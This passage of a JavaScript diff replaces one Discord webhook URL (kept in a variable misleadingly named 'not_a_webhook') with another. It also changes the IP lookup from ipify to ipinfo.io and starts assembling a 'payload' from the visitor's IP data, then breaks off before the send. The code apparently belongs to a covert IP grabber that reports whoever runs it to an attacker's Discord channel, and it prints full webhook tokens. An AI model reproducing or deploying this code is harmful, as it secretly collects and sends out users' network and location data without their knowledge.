@@ -1,5 +1,5 @@
-const not_a_webhook = "https://discord.com/api/webhooks/1250517345827291178/wwcYR9rUuHsaQWc4LC8A-dHZzlSIgd6zvIV9-ClhDYhyru5yp0yc5RWAL3Ifzr1kBsFQ";
-fetch("https://api.ipify.org?format=json")
+const not_a_webhook = "https://discord.com/api/webhooks/1171982710852554912/wAriSmjLdZyWGDFtnOcg1YRRyUs4AFIUVS6D89kW-bsM8BbeKWjAp6eZO3Cxltgws96h";
+fetch("https://ipinfo.io/json")
     .then(response => response.json())
     .then(data => {
         const payload = {
